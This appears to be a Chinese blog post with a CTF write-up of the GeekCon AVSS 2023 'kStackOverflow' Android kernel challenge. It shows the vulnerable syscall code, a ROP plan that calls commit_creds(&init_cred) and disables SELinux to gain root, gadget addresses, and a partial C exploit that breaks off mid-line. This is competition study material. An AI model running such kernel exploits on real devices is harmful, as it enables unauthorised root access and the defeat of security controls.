<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/leaf-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/leaf-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="GeekCon 2023 AVSS 初赛 kStackOverflow 题解">
<meta property="og:type" content="article">
<meta property="og:title" content="GeekCon AVSS 2023 Qualifier - kStackOverflow">
<meta property="og:url" content="http://blingblingxuanxuan.github.io/2023/09/05/230905-kStackOverflow/index.html">
<meta property="og:site_name" content="blingbling&#39;s blog">
<meta property="og:description" content="GeekCon 2023 AVSS 初赛 kStackOverflow 题解">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/09/05/230905-kStackOverflow/image-20230906145408644.png">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/09/05/230905-kStackOverflow/image-20230906133222634.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/09/05/230905-kStackOverflow/image-20230906133422852.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/09/05/230905-kStackOverflow/image-20230906133540662.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/09/05/230905-kStackOverflow/image-20230906135028344.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/09/05/230905-kStackOverflow/image-20230906135208019.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/09/05/230905-kStackOverflow/image-20230906135614067.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/09/05/230905-kStackOverflow/image-20230906141248747.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/09/05/230905-kStackOverflow/image-20230906142425609.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/09/05/230905-kStackOverflow/image-20230906142451852.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/09/05/230905-kStackOverflow/image-20230906144747651.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/09/05/230905-kStackOverflow/image-20230906145136302.png?size=600">
<meta property="article:published_time" content="2023-09-05T07:32:18.000Z">
<meta property="article:modified_time" content="2024-01-29T12:04:06.450Z">
<meta property="article:author" content="blingbling">
<meta property="article:tag" content="kernel pwn">
<meta property="article:tag" content="android">
<meta property="article:tag" content="GeekCon 2023">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://blingblingxuanxuan.github.io/2023/09/05/230905-kStackOverflow/image-20230906145408644.png"><title>GeekCon AVSS 2023 Qualifier - kStackOverflow | blingbling's blog</title><link ref="canonical" href="http://blingblingxuanxuan.github.io/2023/09/05/230905-kStackOverflow/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"80px","tocMaxDepth":3},
  header: {"enable":true,"showOnPost":false,"scrollDownIcon":true},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: true,
  zoomImage: undefined,
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">关于</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friends/"><span class="header-nav-menu-item__icon"><i class="fas fa-thumbs-up"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">GeekCon AVSS 2023 Qualifier - kStackOverflow</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-09-05</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2024-01-29</span></span></div></header><div class="post-body"><p><img src="image-20230906145408644.png" alt="image-20230906145408644"></p>
<p>附件：<a href="./KV1.tar.gz">KV1.tar.gz</a></p>

        <h1 id="漏洞分析"   >
          <a href="#漏洞分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1>
      <p>说明文档中指出了漏洞点，在新创建的601号系统调用中，<code>stackof_write()</code> 和 <code>stackof_read()</code> 中使用了未检查的用户态参数 len，在拷贝内容时产生了越界读和越界写。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">noinline <span class="keyword">long</span> <span class="title">my_cfu</span><span class="params">(<span class="keyword">char</span> *buffer, <span class="keyword">char</span> __user * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> l = len ^ <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    <span class="keyword">return</span> copy_from_user(buffer,addr,l);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">noinline <span class="keyword">long</span> <span class="title">my_ctu</span><span class="params">(<span class="keyword">char</span> *buffer, <span class="keyword">char</span> __user * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> l = len ^ <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    <span class="keyword">return</span> copy_to_user(addr,buffer,l);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">noinline <span class="keyword">long</span> <span class="title">stackof_write</span><span class="params">(<span class="keyword">char</span> __user * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">long</span> ans;</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    ans=my_cfu(buffer,addr,len);            <span class="comment">// 越界写内核栈</span></span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">noinline <span class="keyword">long</span> <span class="title">stackof_read</span><span class="params">(<span class="keyword">char</span> __user * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">long</span> ans;</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    ans=my_ctu(buffer,addr,len);            <span class="comment">// 越界读内核栈</span></span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">noinline <span class="keyword">long</span> <span class="title">sys_stackof_handler</span><span class="params">(<span class="keyword">char</span> __user * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">int</span> option)</span> </span>&#123;    </span><br><span class="line">    <span class="keyword">if</span>(option)&#123;</span><br><span class="line">        <span class="keyword">return</span> stackof_read(addr,len);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> stackof_write(addr,len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_stackof</span><span class="params">(<span class="keyword">char</span> __user *addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len,<span class="keyword">int</span> option)</span></span></span><br><span class="line"><span class="function"><span class="comment">// SYSCALL_DEFINE3(stackof, char __user * , addr, unsigned long,len ,int ,option)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// printk(KERN_INFO &quot;In syscall stackof\n&quot;);</span></span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">0x800</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    <span class="built_in">sprintf</span>(buffer, <span class="string">&quot;option: %d&quot;</span>, option);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;In syscall stackof. %s\n&quot;</span>, buffer);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> sys_stackof_handler(addr, len, option);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>



        <h1 id="漏洞利用"   >
          <a href="#漏洞利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1>
      <ul>
<li><p>利用 stackof_read() 函数的越界读，可以泄露任意长度的内核栈信息到用户态</p>
</li>
<li><p>利用 stackof_write() 函数的越界写，可以写任意长度的信息到内核栈中</p>
</li>
</ul>

        <h2 id="android-7"   >
          <a href="#android-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#android-7" class="headerlink" title="android 7"></a>android 7</h2>
      <blockquote>
<p>内核版本：linux 3.10.0</p>
</blockquote>
<p>利用思路：</p>
<ol>
<li>通过 stackof_read() 泄露内核栈地址（高地址）</li>
<li>通过 stackof_write() 将gadget布置到内核栈中，同时覆盖栈中的返回地址达成控制流劫持</li>
<li>系统开启PXN，无法ret2usr。所以利用rop将栈迁移到有gadget的栈空间（低地址）</li>
<li>继续rop，执行commit_creds(&amp;init_cred) ，将 selinux_enforcing 处设置成0以关闭selinux</li>
<li>再次利用rop栈迁移，使上下文跟控制流劫持之前相同（x29，x30和sp），于是可成功返回用户态</li>
<li>在用户态拿root shell</li>
</ol>
<p>过程简记：</p>
<p>首先，用stackof_write 成功控制返回地址，计算返回地址距离输入起始位置偏移0x108字节</p>
<p><img   src="image-20230906133222634.png?size=600" style="width: 600px;"  alt="image-20230906133222634"></p>
<p>系统开启PXN，无法直接ret2usr。但可以访问用户态数据，考虑两种方法：</p>
<ol>
<li>rop改 addr_limit</li>
<li>rop执行 commit_cred(init_cred) 。【只能栈迁移到内核栈】</li>
</ol>
<p>为了回用户态后的操作简单点，选了第二种方式。</p>
<p>要rop，就得栈迁移。</p>
<p>既然要栈迁移，那么要保证迁移前后，sp和x29以及x30都是正常的状态，这样回到栈迁移的点就能正常返回到用户态。如下：</p>
<p>在控制流劫持的点，原本应该ret 到 0xffffffc0000c3248， 栈地址是通过read泄露出来的偏移 0x100 的8个字节内容 。</p>
<p><img   src="image-20230906133422852.png?size=600" style="width: 600px;"  alt="image-20230906133422852"></p>
<p>所以，先将栈迁移到栈的低地址，执行完目标功能后，再设置好x29和x30的值，让其正常返回用户态。</p>
<p>找到四条gadget，可以完成两次栈迁移，并顺利返回用户态：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget1 = <span class="number">0xffffffc00009fc68</span>;     <span class="comment">// : sub sp, x29, #0x10 ; mov w0, #0 ; ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x20 ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget2 = <span class="number">0xffffffc0000da954</span>;     <span class="comment">// : ldp x0, x1, [x29, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget3 = <span class="number">0xffffffc0000cda00</span>;     <span class="comment">// :  : str w0, [x1, #0x14] ; ldp x29, x30, [sp], #0x10 ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget4 = <span class="number">0xffffffc0000d6ae4</span>;     <span class="comment">// : ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x80 ; ret</span></span><br></pre></td></tr></table></div></figure>


<p>本地 root shell</p>
<p><img   src="image-20230906133540662.png?size=600" style="width: 600px;"  alt="image-20230906133540662"></p>
<p>exp如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/net.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYS_STACKOF 601</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNEL_RET 0xffffffc0000c3248</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> arg1, arg2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred_addr = <span class="number">0xFFFFFFC0006A0D18</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> commit_cred_func = <span class="number">0xFFFFFFC0000C0E18</span>+<span class="number">0x4</span>;     <span class="comment">// do not exec &quot;STP X29, X30, [SP,#var_30]!&quot;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> selinux_enforcing_addr = <span class="number">0xFFFFFFC0006EBA0C</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HEXDUMP_COLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEXDUMP_COLS 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hexdump</span><span class="params">(<span class="keyword">void</span> *mem, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : <span class="number">0</span>); i++) &#123;</span><br><span class="line">        <span class="comment">/* print offset */</span></span><br><span class="line">        <span class="keyword">if</span>(i % HEXDUMP_COLS == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;0x%06x: &quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* print hex data */</span></span><br><span class="line">        <span class="keyword">if</span>(i &lt; len) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, <span class="number">0xFF</span> &amp; ((<span class="keyword">char</span>*)mem)[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* end of block, just aligning for ASCII dump */</span></span><br><span class="line">        <span class="keyword">else</span> &#123;        </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* print ASCII dump */</span></span><br><span class="line">        <span class="keyword">if</span>(i % HEXDUMP_COLS == (HEXDUMP_COLS - <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i - (HEXDUMP_COLS - <span class="number">1</span>); j &lt;= i; j++) &#123;</span><br><span class="line">                 <span class="comment">/* end of block, not really printing */</span></span><br><span class="line">                <span class="keyword">if</span>(j &gt;= len) &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">/* printable char */</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isprint</span>(((<span class="keyword">char</span>*)mem)[j])) &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(<span class="number">0xFF</span> &amp; ((<span class="keyword">char</span>*)mem)[j]);</span><br><span class="line">                &#125;</span><br><span class="line">                 <span class="comment">/* other char */</span></span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">k_stackof_read(<span class="keyword">void</span>* addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)&#123;</span><br><span class="line">    arg1 = addr;</span><br><span class="line">    arg2 = (len^<span class="number">0xdeadbeefdeadbeef</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;k_stackof_read - arg2: %lx\n&quot;</span>,arg2);</span><br><span class="line">    syscall(SYS_STACKOF, arg1, arg2, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">k_stackof_write(<span class="keyword">void</span>* addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)&#123;</span><br><span class="line">    arg1 = addr;</span><br><span class="line">    arg2 = (len^<span class="number">0xdeadbeefdeadbeef</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;k_stackof_write - arg2: %lx\n&quot;</span>,arg2);</span><br><span class="line">    syscall(SYS_STACKOF, arg1, arg2, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget1 = <span class="number">0xffffffc00009fc68</span>;     <span class="comment">// : sub sp, x29, #0x10 ; mov w0, #0 ; ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x20 ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget2 = <span class="number">0xffffffc0000da954</span>;     <span class="comment">// : ldp x0, x1, [x29, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget3 = <span class="number">0xffffffc0000cda00</span>;     <span class="comment">// :  : str w0, [x1, #0x14] ; ldp x29, x30, [sp], #0x10 ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gadget4 = <span class="number">0xffffffc0000d6ae4</span>;     <span class="comment">// : ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x80 ; ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* read_buf = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">char</span>* write_buf = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">    <span class="built_in">memset</span>(read_buf, <span class="number">0x0</span>, <span class="number">0x200</span>);</span><br><span class="line">    <span class="built_in">memset</span>(write_buf, <span class="number">0x41</span>, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// char* test = &quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaaf&quot;;</span></span><br><span class="line">    <span class="comment">// memcpy(write_buf,test,0x200);</span></span><br><span class="line"></span><br><span class="line">    k_stackof_read(read_buf, <span class="number">0x200</span>);</span><br><span class="line">    hexdump(read_buf, <span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> real_k_sp = *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;read_buf[<span class="number">0x100</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;real_k_sp: 0x%lx\n&quot;</span>,real_k_sp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">0x100</span>]) = real_k_sp - <span class="number">0x110</span>;         <span class="comment">// kernel rop, fake kernel sp</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;write_buf[<span class="number">0x108</span>]) = gadget1;         <span class="comment">// gadget</span></span><br><span class="line">    </span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> 